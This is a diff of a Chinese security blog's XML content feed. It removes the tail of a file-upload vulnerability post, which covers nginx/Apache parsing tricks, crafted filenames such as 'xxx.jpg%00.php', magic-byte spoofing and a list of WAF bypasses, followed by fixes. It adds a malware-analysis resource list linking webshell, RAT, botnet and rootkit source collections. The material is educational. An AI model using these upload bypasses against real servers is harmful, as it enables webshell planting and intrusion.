-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) nginx空字节漏洞</span><br><span class="line"></span><br><span class="line">xxx.jpg%00.php 这样的文件名会被解析为php代码运行</span><br><span class="line"></span><br><span class="line">2）apache解析漏洞</span><br><span class="line"></span><br><span class="line">上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别癿，因此就会直接将类型识别为php，从而达到注入php代码的目的</span><br></pre></td></tr></table></figure>
-
-<p>(2) .htaccess 文件重写绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录访问、禁止目录列表、配置默认文档等功能</span><br><span class="line"></span><br><span class="line">配合黑名单列表绕过，上传一个自定义的.htaccess和一句话图片木马，可绕过各种检测</span><br></pre></td></tr></table></figure>
-
-<p>(3) 文件头检测绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件头过滤主要是通过验证图片的文件头的方式来判断是不是图片文件，针对这种情况，在要上传文件的文件头里面加上图片文件头即可绕过；如图片文件是否文件头含有gif89,可以通过一句话图片木马生成工具edjpgcom或者通过编辑器在木马内容基础上再加一些文件信息</span><br><span class="line"></span><br><span class="line">不同的图片文件都有不同文件头，如：</span><br><span class="line"></span><br><span class="line">  PNG：文件头标识(8 bytes) 89 50 4E 47 0D 0A 1A 0A</span><br><span class="line">  JPEG：文件头标识(2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)</span><br><span class="line">  GIF：文件头标识(6 bytes) 4749 46 38 39(37) 61</span><br></pre></td></tr></table></figure>
-
-<p>(4) CMS、编辑器漏洞绕过CMS漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">针对不同CMS存在的上传漏洞进行绕过</span><br><span class="line"></span><br><span class="line">编辑器漏洞：如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过</span><br></pre></td></tr></table></figure>
-
-<p>(5) 对渲染&#x2F;加载测试攻击内容检查绕过</p>
-<pre><code>通过向图片中加入代码注入，这里一般为一句话图片木马，可能正常访问图片
-</code></pre>
-<h3 id="4-WAF绕过"><a href="#4-WAF绕过" class="headerlink" title="4. WAF绕过"></a>4. WAF绕过</h3><p>(1) WAF检查的位置</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名：解析文件名，判断是否在黑名单内</span><br><span class="line"></span><br><span class="line">文件内容：解析文件内容，判断是否为webshell</span><br><span class="line"></span><br><span class="line">文件目录权限</span><br><span class="line"></span><br><span class="line">请求的url</span><br><span class="line"></span><br><span class="line">Boundary边界</span><br><span class="line"></span><br><span class="line">MIME文件类型</span><br></pre></td></tr></table></figure>
-
-<p>(2) 绕过WAF方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 填充垃圾数据绕过</span><br><span class="line"></span><br><span class="line">有些主机WAF软件会对校验的用户数据设置大小上限，此种情况可以构造一个大文件，在木马内容前填充垃圾内容，可以绕过WAF对文件内容的校验; 可在Content-Type类型数据后添加垃圾数据，也可以将垃圾数据放在数据包最开头、绕过对文件名的校验</span><br><span class="line"></span><br><span class="line">2) POST/GET的更改方法绕过</span><br><span class="line"></span><br><span class="line">有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。此种情况可以上传一个POST型的数据包，抓包将POST改为GET</span><br><span class="line"></span><br><span class="line">3) 删除实体里面的Conten-Type字段绕过</span><br><span class="line"></span><br><span class="line">4) 删除Content-Disposition字段里的空格绕过</span><br><span class="line"></span><br><span class="line">5) 修改Content-Disposition字段值的大小写绕过  </span><br><span class="line"></span><br><span class="line">6) 文件扩展名出回车绕过（只支持php）</span><br><span class="line"></span><br><span class="line">7) 利用NTFS ADS特性绕过</span><br><span class="line"></span><br><span class="line">ADS是NTFS磁盘格式的一个特性，用亍NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过</span><br><span class="line"></span><br><span class="line">8) 文件重命名绕过</span><br><span class="line"></span><br><span class="line">如果web程序会将filename除了扩展名的那段重命名的话，可以构造更多的点、符号等绕过</span><br><span class="line"></span><br><span class="line">9) 特殊的长文件名绕过</span><br><span class="line"></span><br><span class="line">文件名使用非字母数字，比如中文等最大程度的拉长</span><br><span class="line"></span><br><span class="line">10) 引号去掉，双引号变单引号绕过</span><br><span class="line"></span><br><span class="line">11) 删除Content-Disposition值的form-data绕过</span><br><span class="line"></span><br><span class="line">12) 多个分号绕过</span><br><span class="line"></span><br><span class="line">当WAF遇到name=&quot;myfile&quot;;;时，认为没有解析到filename。而后端容器继续解析到的文件名是bk.php，导致WAF被绕过</span><br><span class="line"></span><br><span class="line">13) name和filename添加任意字符串(长度大于等于508）</span><br><span class="line"></span><br><span class="line">14) head头的content-type：tab绕过</span><br><span class="line"></span><br><span class="line">15) head头的content-type: multipart/form-data改成大写绕过</span><br><span class="line"></span><br><span class="line">16) head头的Content-Type: multipart/form-data;\n绕过</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x08-漏洞修复"><a href="#0x08-漏洞修复" class="headerlink" title="0x08 漏洞修复"></a>0x08 漏洞修复</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 将文件上传的目录设置为不可执行：只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响</span><br><span class="line"></span><br><span class="line">(3) 文件类型检查(白名单)</span><br><span class="line"></span><br><span class="line">在判断文件类型时，可以结合使用MIME Type、后缀检查等方式，在文件类型检查中，推荐白名单方式；此外对于图片的处理可使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码</span><br><span class="line"></span><br><span class="line">(4) 改写文件名和文件路径</span><br><span class="line"></span><br><span class="line">文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本</span><br><span class="line"></span><br><span class="line">(4) 本地文件上传限制被绕过：在服务器后端对上传的文件进行过滤</span><br><span class="line"></span><br><span class="line">(5) 单独设置文件服务器的域名</span><br><span class="line"></span><br><span class="line">由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript癿XSS利用等问题将得到解决</span><br><span class="line"></span><br><span class="line">(6) 开源编辑器上传漏洞</span><br><span class="line"></span><br><span class="line">更新编辑器版本,修复已知漏洞</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>漏洞研究</category>
-      </categories>
-      <tags>
-        <tag>Vulner</tag>
-        <tag>Execution</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>弱口令爆破姿势</title>
     <url>/posts/10235/</url>
     <content><![CDATA[<center>本文总结各类弱口令漏洞类型及利用方式...</center>
@@ -1944,6 +1679,271 @@ msf auxiliary(arp_sweep) &gt; run
       </tags>
   </entry>
   <entry>
+    <title>恶意软件分析资源</title>
+    <url>/posts/12996/</url>
+    <content><![CDATA[<center>本文汇总恶意软件分析中样本来源、分析工具、技术网站等资源...</center>
+
+<span id="more"></span>
+
+<h2 id="0x01-样本来源"><a href="#0x01-样本来源" class="headerlink" title="0x01 样本来源"></a>0x01 样本来源</h2><h3 id="1-下载网站"><a href="#1-下载网站" class="headerlink" title="1. 下载网站"></a>1. 下载网站</h3><ul>
+<li><a href="https://s.threatbook.cn/">https://s.threatbook.cn/</a> 微步云沙箱</li>
+<li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a> 在线样本获取</li>
+<li><a href="https://app.any.run/">https://app.any.run/</a> 在线样本分析</li>
+<li><a href="https://bazaar.abuse.ch/browse/">https://bazaar.abuse.ch/browse/</a>  MalwareBazaar Database</li>
+<li><a href="https://vx-underground.org/samples.html">https://vx-underground.org/samples.html</a> 恶意软件在线下载</li>
+<li><a href="https://github.com/ytisf/theZoo">https://github.com/ytisf/theZoo</a>  恶意软件分析开源项目</li>
+<li><a href="https://objective-see.com/malware.html">https://objective-see.com/malware.html</a> MacOS恶意软件样本</li>
+<li><a href="http://contagiodump.blogspot.com/">http://contagiodump.blogspot.com/</a> Contagio恶意软件收集平台</li>
+<li><a href="https://www.hybrid-analysis.com/">https://www.hybrid-analysis.com/</a>  Payload Security恶意软件分析</li>
+<li><a href="http://vxvault.net/ViriList.php">http://vxvault.net/ViriList.php</a>  该网站为恶意软件和urls的收集</li>
+</ul>
+<h3 id="2-分类样本"><a href="#2-分类样本" class="headerlink" title="2. 分类样本"></a>2. 分类样本</h3><ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>  Payloads合集</li>
+<li><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>  Exploit 和 shellcode 样本</li>
+<li><a href="https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/pubhtml">https://docs.google.com/spreadsheets/</a> 勒索软件列表</li>
+<li><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a>  Webshell资源</li>
+<li><a href="https://github.com/milabs/awesome-linux-rootkits">https://github.com/milabs/awesome-linux-rootkits</a> Linux rootkit合集</li>
+<li><a href="https://github.com/d30sa1/RootKits-List-Download">https://github.com/d30sa1/RootKits-List-Download</a>  Rootkit下载列表</li>
+<li><a href="https://github.com/alphaSeclab/awesome-rat">https://github.com/alphaSeclab/awesome-rat</a>  远控木马合集</li>
+<li><a href="https://github.com/maestron/botnets">https://github.com/maestron/botnets</a> Botnet源码合集</li>
+</ul>
+<h3 id="3-样本合集"><a href="#3-样本合集" class="headerlink" title="3. 样本合集"></a>3. 样本合集</h3><ul>
+<li><a href="https://github.com/vxunderground/MalwareSourceCode">https://github.com/vxunderground/MalwareSourceCode</a>  不同平台不同语言恶意软件源码</li>
+<li><a href="https://github.com/InQuest/malware-samples">https://github.com/InQuest/malware-samples</a> 恶意软件样本与分析文章集合</li>
+<li><a href="https://github.com/RamadhanAmizudin/malware">https://github.com/RamadhanAmizudin/malware</a> Malwaretech恶意样本集</li>
+<li><a href="https://github.com/mstfknn/malware-sample-library">https://github.com/mstfknn/malware-sample-library</a> 恶意软件样本库</li>
+<li><a href="https://github.com/ashishb/android-malware">https://github.com/ashishb/android-malware</a> Andorid恶意样本库</li>
+</ul>
+<h2 id="0x02-分析工具"><a href="#0x02-分析工具" class="headerlink" title="0x02 分析工具"></a>0x02 分析工具</h2><h3 id="1-Linux平台"><a href="#1-Linux平台" class="headerlink" title="1. Linux平台"></a>1. Linux平台</h3><h4 id="a-静态分析"><a href="#a-静态分析" class="headerlink" title="a. 静态分析"></a>a. 静态分析</h4><ul>
+<li><a href="https://linux.die.net/man/1/file">file</a> – 显示文件的类型</li>
+<li><a href="https://linux.die.net/man/1/strings">strings</a>– 从文件中提取字符串</li>
+<li><a href="http://man7.org/linux/man-pages/man1/diff.1.html">diff</a> – 区分文件</li>
+<li><a href="https://linux.die.net/man/1/nm">nm</a> – 提取符号表（函数导入、导出）</li>
+<li><a href="https://linux.die.net/man/1/strace">strace</a> – 跟踪系统调用和信号</li>
+<li><a href="http://ntinfo.biz/index.html">DiE</a> – 封隔器标识符（推荐）</li>
+</ul>
+<h4 id="b-动态分析"><a href="#b-动态分析" class="headerlink" title="b. 动态分析"></a>b. 动态分析</h4><ul>
+<li><a href="https://www.wireshark.org/download.html">Wireshark</a> – 网络分析工具</li>
+<li><a href="https://linux.die.net/man/8/tcpdump">tcpdump</a>  – 网络分析工具</li>
+<li><a href="https://github.com/mitmproxy/mitmproxy">MiTMProxy</a> –一个交互式 SSL&#x2F;TLS 拦截 HTTP 代理</li>
+<li><a href="https://www.netresec.com/?page=Blog&month=2014-02&post=HowTo-install-NetworkMiner-in-Ubuntu-Fedora-and-Arch-Linux">NetworkMiner</a> – 嗅探器和 PCAP 解析器</li>
+<li><a href="https://portswigger.net/burp/communitydownload">Burp Suite</a> – 适用于任何浏览器、系统或平台的免费网络代理</li>
+<li><a href="https://www.inetsim.org/packages.html">INetSim</a> – 互联网服务模拟套件</li>
+</ul>
+<p>适用于 Linux 的 Procmon</p>
+<h4 id="c-逆向工具"><a href="#c-逆向工具" class="headerlink" title="c. 逆向工具"></a>c. 逆向工具</h4><ul>
+<li><a href="https://linux.die.net/man/1/gdb">GDB</a> – GNU 调试器</li>
+<li><a href="https://www.hex-rays.com/products/ida/support/download.shtml">IDA Free&#x2F;Pro</a> – 反汇编器和调试器</li>
+<li><a href="https://www.hopperapp.com/">Hopper</a> – 反汇编器和调试器</li>
+<li><a href="https://rada.re/r/">radare2</a> - 免费和开源的反汇编器和调试器</li>
+<li><a href="https://github.com/radareorg/cutter">Cutter</a> -radare2 的 GUI</li>
+<li><a href="https://binary.ninja/">Binary Ninja</a> – 一种新型的逆向平台</li>
+<li><a href="https://github.com/angr/angr">angr</a> – 跨平台二进制分析框架</li>
+</ul>
+<h4 id="d-脱壳反混淆"><a href="#d-脱壳反混淆" class="headerlink" title="d. 脱壳反混淆"></a>d. 脱壳反混淆</h4><ul>
+<li><a href="https://github.com/fireeye/flare-floss">FLOSS</a> – 自动从恶意软件中提取混淆的字符串</li>
+<li><a href="https://github.com/hiddenillusion/NoMoreXOR">NoMoreXor</a> – 通过使用频率分析帮助猜测文件 256 字节 XOR 密钥的工具</li>
+<li><a href="https://blog.didierstevens.com/programs/xorsearch/">XorSearch</a> -用于在 XOR、ROL、ROT 或 SHIFT 编码的二进制文件中搜索给定字符串</li>
+</ul>
+<h4 id="e-取证工具"><a href="#e-取证工具" class="headerlink" title="e. 取证工具"></a>e. 取证工具</h4><ul>
+<li><a href="http://man7.org/linux/man-pages/man1/dd.1.html">dd</a> – 硬盘取证获取工具</li>
+<li><a href="http://www.sleuthkit.org/autopsy/download.php">Autopsy</a> - 硬盘取证分析工具</li>
+<li><a href="https://github.com/504ensicsLabs/LiME">LiME</a> – 内存获取工具</li>
+<li><a href="https://github.com/volatilityfoundation/volatility">Volatility</a> – 内存取证分析框架</li>
+<li><a href="https://fogproject.org/">FOG</a> — 免费的开源网络计算机克隆和管理解决方案</li>
+</ul>
+<h4 id="f-综合工具"><a href="#f-综合工具" class="headerlink" title="f. 综合工具"></a>f. 综合工具</h4><ul>
+<li><a href="https://github.com/monnappa22/Limon">Limon Sandbox</a> – 免费开源的自动化 Linux 恶意软件分析沙箱</li>
+<li><a href="https://cuckoosandbox.org/">Cuckoo Sandbox</a> – 免费开源的自动化恶意软件分析沙箱</li>
+</ul>
+<h3 id="2-Windwos平台"><a href="#2-Windwos平台" class="headerlink" title="2. Windwos平台"></a>2. Windwos平台</h3><h4 id="a-静态分析-1"><a href="#a-静态分析-1" class="headerlink" title="a. 静态分析"></a>a. 静态分析</h4><ul>
+<li><a href="https://mh-nexus.de/en/downloads.php?product=HxD20">HxD</a> – 十六进制查看器和编辑器</li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/">strings</a> – 从文件中提取字符串</li>
+<li><a href="https://www.nirsoft.net/utils/hash_my_files.html">HashMyFiles</a> – 计算文件的 MD5&#x2F;SHA1&#x2F;CRC32 哈希值</li>
+<li><a href="http://ntinfo.biz/index.html">DiE</a> – 封隔器标识符</li>
+<li><a href="https://www.aldeid.com/wiki/PEiD">PEiD</a> – 封隔器标识符</li>
+<li><a href="https://www.winitor.com/">PeStudio</a> – 高级 PE 查看器等</li>
+<li><a href="https://ntcore.com/?page_id=388">CFF Explorer</a> – PE 编辑器</li>
+<li><a href="http://www.angusj.com/resourcehacker/">Resource Hacker</a> – 资源编辑器</li>
+<li><a href="https://blog.didierstevens.com/programs/oledump-py/">oledump.py</a> – OLE 文件分析器</li>
+<li><a href="http://www.reconstructer.org/">OfficeMalScanner</a> – Office 文件恶意软件扫描程序</li>
+<li><a href="https://blog.didierstevens.com/2009/03/31/pdfid/">PDFiD</a> – PDF 字符串扫描仪和标识符</li>
+<li><a href="http://sandsprite.com/blogs/index.php?uid=7&pid=57">PDFStreamDumper</a> – PDF 恶意文件扫描程序</li>
+<li><a href="https://github.com/smalot/pdfparser">PDFParser</a> – PDF 文件数据提取器</li>
+</ul>
+<h4 id="b-动态分析-1"><a href="#b-动态分析-1" class="headerlink" title="b. 动态分析"></a>b. 动态分析</h4><ul>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/">Process Explorer</a> - 高级任务管理器</li>
+<li><a href="https://processhacker.sourceforge.io/downloads.php">Process Hacker</a> - 高级任务管理器</li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/">Process Monitor</a> – 监控系统进程事件（文件系统、注册表、网络）</li>
+<li><a href="https://sourceforge.net/projects/regshot/">Regshot</a> – 注册表比较程序</li>
+<li><a href="http://www.rohitab.com/downloads">API Monitor</a> – 监视 Windows API 函数（内存转储、断点等）</li>
+<li><a href="https://github.com/hasherezade/pe-sieve">PE-Sieve</a> – 扫描恶意植入（替换&#x2F;注入 PE、shellcode、钩子、内存补丁）</li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/">TCPView</a> – 显示网络连接</li>
+<li><a href="https://www.telerik.com/fiddler">Fiddler</a> – 适用于任何浏览器、系统或平台的免费Web调试代理</li>
+<li><a href="https://github.com/fireeye/flare-fakenet-ng">FakeNet-NG</a> – 模拟服务&#x2F;开放端口以进行恶意软件行为分析</li>
+<li><a href="https://www.inetsim.org/downloads.html">INetSim</a> – 模拟服务&#x2F;开放端口以进行恶意软件行为分析</li>
+<li><a href="https://www.fireeye.com/services/freeware/apatedns.html">ApateDNS</a> – 控制 DNS 响应</li>
+<li><a href="https://github.com/mitmproxy/mitmproxy">MiTMProxy</a> – 一个交互式 SSL&#x2F;TLS 拦截 HTTP 代理（非常适合 HTTPS 检查）</li>
+<li><a href="https://www.netresec.com/index.ashx?page=NetworkMiner">NetworkMiner</a> – 嗅探器和 PCAP 解析器</li>
+<li><a href="https://www.procdot.com/">ProcDot</a> – 一种新的可视化恶意软件分析工具</li>
+<li><a href="https://www.phrozen.io/docs/windows/projects/freeware/winja/">WinJa</a> – 一个轻量级但功能强大的工具，用于发现隐藏在您系统中的恶意软件</li>
+<li><a href="https://www.kahusecurity.com/tools.html">CMD Watcher</a> – 监视 CMD、PowerShell 和其他进程，暂停它，提取命令行数据，然后有选择地杀死它</li>
+</ul>
+<h4 id="c-逆向工具-1"><a href="#c-逆向工具-1" class="headerlink" title="c. 逆向工具"></a>c. 逆向工具</h4><ul>
+<li><a href="https://x64dbg.com/">x64dbg</a> – 用户模式调试器</li>
+<li><a href="http://www.ollydbg.de/version2.html">OllyDbg</a> – 用户模式调试器</li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">WinDbg</a> – 内核模式调试器</li>
+<li><a href="https://github.com/SinaKarvandi/windbg2ida">WinDBG2IDA</a> — 显示 IDA 中的 WinDBG 步骤</li>
+<li><a href="https://github.com/avast/retdec">RetDec</a> – 基于 LLVM 的可重定向机器代码反编译器</li>
+<li><a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a> – NSA 软件逆向工程框架</li>
+</ul>
+<h4 id="d-脱壳反混淆-1"><a href="#d-脱壳反混淆-1" class="headerlink" title="d. 脱壳反混淆"></a>d. 脱壳反混淆</h4><ul>
+<li><a href="https://github.com/hiddenillusion/NoMoreXOR">NoMoreXor</a> – 通过使用频率分析帮助猜测文件 256 字节 XOR 密钥的工具</li>
+<li><a href="https://github.com/BromiumLabs/PackerAttacker">PackerAttacker</a> – 使用内存和代码挂钩来检测加壳程序的 C++ 应用程序</li>
+<li><a href="https://github.com/unipacker/unipacker">UniPacker</a> – 基于仿真的 Windows 二进制文件的自动和平台独立解包器</li>
+<li><a href="https://github.com/malwaremusings/unpacker/">unpacker</a> - WinAppDbg脚本来自动执行恶意拆包</li>
+</ul>
+<h4 id="e-加壳工具"><a href="#e-加壳工具" class="headerlink" title="e. 加壳工具"></a>e. 加壳工具</h4><ul>
+<li><a href="https://upx.github.io/">UPX</a> – Windows PE Packer</li>
+<li><a href="https://www.alternate-tools.com/pages/c_exepacker.php?lang=ENG">Alterante EXE Packer</a> – 基于 UPX打包程序</li>
+<li><a href="https://enigmaprotector.com/">Enigma Protector</a> – 用于许可和保护Windows 可执行文件的专业系统</li>
+<li><a href="https://www.webtoolmaster.com/exestealth.htm">ExeStealth</a> – Delphi、Visual Basic 和 C++ PE打包程序</li>
+<li><a href="https://www.oreans.com/Themida.php">Themida</a> - 高级Windows 软件保护系统</li>
+<li><a href="https://vmpsoft.com/">VMProtect</a> – VMProtect 通过在具有非标准架构的虚拟机上执行代码来保护代码</li>
+</ul>
+<h4 id="f-取证工具"><a href="#f-取证工具" class="headerlink" title="f. 取证工具"></a>f. 取证工具</h4><ul>
+<li><a href="https://winpmem.velocidex.com/">WinPmem</a> – 内存取证获取工具</li>
+<li><a href="https://blog.comae.io/your-favorite-memory-toolkit-is-back-f97072d33d5c">DumpIt</a> – 内存取证获取工具</li>
+<li><a href="https://accessdata.com/product-download/ftk-imager-version-4-2-0">FTK Imager</a> – 硬盘和内存取证获取工具</li>
+<li><a href="https://github.com/google/rekall">Rekall</a> – 内存取证框架</li>
+<li><a href="https://www.fireeye.com/services/freeware/redline.html">Readline</a> - 内存取证分析工具</li>
+</ul>
+<h4 id="g-综合工具"><a href="#g-综合工具" class="headerlink" title="g. 综合工具"></a>g. 综合工具</h4><ul>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/">Sysinternals Suite</a> – Microsoft 用于分析 Windows 系统内部的工具</li>
+<li><a href="https://github.com/fireeye/flare-vm">Flare-VM</a> – 基于 Windows 的恶意软件分析安全工具</li>
+</ul>
+<h3 id="3-MacOS平台"><a href="#3-MacOS平台" class="headerlink" title="3. MacOS平台"></a>3. MacOS平台</h3><h4 id="a-静态分析-2"><a href="#a-静态分析-2" class="headerlink" title="a. 静态分析"></a>a. 静态分析</h4><ul>
+<li><a href="https://www.unix.com/man-page/osx/1/codesign/">codesign</a>  – 提取代码签名认证状态等</li>
+<li><a href="https://www.unix.com/man-page/osx/8/spctl/">spctl</a> – 检查文件的认证是否被撤销等等</li>
+<li><a href="https://www.unix.com/man-page/osx/1/xattr/">xattr</a> – 检查属性文件是否包含以及包含哪些属性（例如 GateKeeper 检查的隔离标志）</li>
+<li><a href="https://www.unix.com/man-page/osx/1/otool/">otool</a> – 检查二进制文件、提取汇编指令、查看段、节等</li>
+<li><a href="http://www.newosxbook.com/tools/jtool.html">JTool</a> – otool的升级本工具</li>
+<li><a href="https://objective-see.com/products.html">What’s your Sign</a> – 检查代码签名认证状态，显示哈希值等</li>
+</ul>
+<h4 id="b-动态分析-2"><a href="#b-动态分析-2" class="headerlink" title="b. 动态分析"></a>b. 动态分析</h4><ul>
+<li><a href="https://objective-see.com/products/utilities.html#ProcessMonitor">ProcessMonitor</a> – 监控流程活动</li>
+<li><a href="https://objective-see.com/products/utilities.html#FileMonitor">FileMonitor</a> – 监控文件系统事件</li>
+<li><a href="https://github.com/dpnishant/appmon">AppMon</a> – 基于 Frida 的监控和篡改系统 API 调用的自动化框架</li>
+<li><a href="https://fsmonitor.com/">FSMonitor</a> – 监控文件系统事件（读、写等）</li>
+<li><a href="https://objective-see.com/products.html">Netiquette</a> – 监控网络连接</li>
+<li><a href="https://objective-see.com/products.html">LuLu</a> – 检查网络可疑活动并显示</li>
+<li><a href="https://objective-see.com/products.html">TaskExplorer</a> –虚拟探索所有正在运行的进程</li>
+<li><a href="https://objective-see.com/products.html">ReiKey</a> – 动态拦截和检测键盘记录活动</li>
+<li><a href="https://objective-see.com/products.html">BlockBlock</a> – 动态拦截系统上的持久操作</li>
+</ul>
+<h4 id="c-逆向工具-2"><a href="#c-逆向工具-2" class="headerlink" title="c. 逆向工具"></a>c. 逆向工具</h4><ul>
+<li><a href="https://lldb.llvm.org/">LLDB</a> – 类似 GDB 的 macOS 调试器</li>
+</ul>
+<h4 id="d-打包加壳"><a href="#d-打包加壳" class="headerlink" title="d. 打包加壳"></a>d. 打包加壳</h4><ul>
+<li><a href="https://www.pouet.net/prod.php?which=29185">iPakk</a> – MacOSX Mach-O (PPC)打包程序</li>
+<li><a href="https://www.pouet.net/prod.php?which=51324">muncho</a> – MacOSX Mach-O（英特尔）打包程序</li>
+<li><a href="https://www.pouet.net/prod.php?which=66926">oneKpaq</a> – MacOSX Mach-O (Intel)打包程序</li>
+</ul>
+<h4 id="e-取证工具-1"><a href="#e-取证工具-1" class="headerlink" title="e. 取证工具"></a>e. 取证工具</h4><ul>
+<li><a href="http://macappstore.org/dcfldd/">dcfldd</a> – 硬盘取证获取工具</li>
+<li><a href="https://github.com/ydkhatri/mac_apt">mac_apt</a> – 硬盘取证分析工具</li>
+<li><a href="https://github.com/wrmsr/pmem/tree/master/OSXPMem">OSXPMem</a> – 内存取证获取工具</li>
+</ul>
+<h4 id="f-其他工具"><a href="#f-其他工具" class="headerlink" title="f. 其他工具"></a>f. 其他工具</h4><ul>
+<li><a href="https://objective-see.com/products.html">KnockKnock</a> – 扫描持久性对象并将它们上传到 VirusTotal</li>
+<li><a href="https://objective-see.com/products.html">KextViewr</a> – 显示所有已加载的 kext，以及它们的签名状态、完整路径、VirusTotal 检测率等</li>
+<li><a href="https://objective-see.com/products.html">Dylib Hijack Scanner</a> – 扫描系统周围潜在的 Dylib-Hijackable 应用程序</li>
+</ul>
+<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul>
+<li><a href="https://malwareanalysis.co/">https://malwareanalysis.co/</a></li>
+<li><a href="https://github.com/rshipp/awesome-malware-analysis">https://github.com/rshipp/awesome-malware-analysis</a></li>
+<li><a href="https://zeltser.com/malicious-software/">https://zeltser.com/malicious-software/</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>样本分析</category>
+      </categories>
+      <tags>
+        <tag>Malware Analysis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞详解</title>
+    <url>/posts/50059/</url>
+    <content><![CDATA[<center>本文记录文件上传漏洞原理、产生原因、绕过姿势及防御方法</center>
+
+<span id="more"></span>
+<hr>
+<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><pre><code>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力，代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验
+
+这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等，这种攻击方式是最为直接和有效的，是getshell最快最直接的方法之一
+</code></pre>
+<h2 id="0x02-威胁场景"><a href="#0x02-威胁场景" class="headerlink" title="0x02 威胁场景"></a>0x02 威胁场景</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 上传文件是Web脚本语言，Web服务器解释并执行了用户上传的脚本，导致代码执行</span><br><span class="line"></span><br><span class="line">(2) 上传文件是病毒或者木马时，可用于诱骗用户或者管理员下载执行或者直接自动运行</span><br><span class="line"></span><br><span class="line">(3) 上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为</span><br><span class="line"></span><br><span class="line">(4) 上传文件是钓鱼图片或包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈</span><br><span class="line"></span><br><span class="line">(5) 上传一个合法的文本文件，其内容包含了PHP脚本，再通过&quot;本地文件包含漏洞(Local  File  Include)&quot;执行此脚本</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-触发条件"><a href="#0x03-触发条件" class="headerlink" title="0x03 触发条件"></a>0x03 触发条件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 上传的文件能够被Web容器解释执行，文件上传后所在的目录需是Web容器所覆盖到的路径</span><br><span class="line"></span><br><span class="line">(2) 上传的文件能够从Web上访问</span><br><span class="line"></span><br><span class="line">(3) 上传的文件未被安全检查、格式化、图片压缩等功能改变内容</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-漏洞成因"><a href="#0x04-漏洞成因" class="headerlink" title="0x04 漏洞成因"></a>0x04 漏洞成因</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.服务器配置不当</span><br><span class="line"></span><br><span class="line">2.开源编辑器上传漏洞</span><br><span class="line"></span><br><span class="line">3.本地文件上传限制被绕过</span><br><span class="line"></span><br><span class="line">4.过滤不严或被绕过</span><br><span class="line"></span><br><span class="line">5.文件解析漏洞导致文件执行</span><br><span class="line"></span><br><span class="line">6.文件路径截断</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-漏洞原理"><a href="#0x05-漏洞原理" class="headerlink" title="0x05 漏洞原理"></a>0x05 漏洞原理</h2><pre><code>大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本
+
+当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，用于getshell。根据具体漏洞的差异，上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本
+</code></pre>
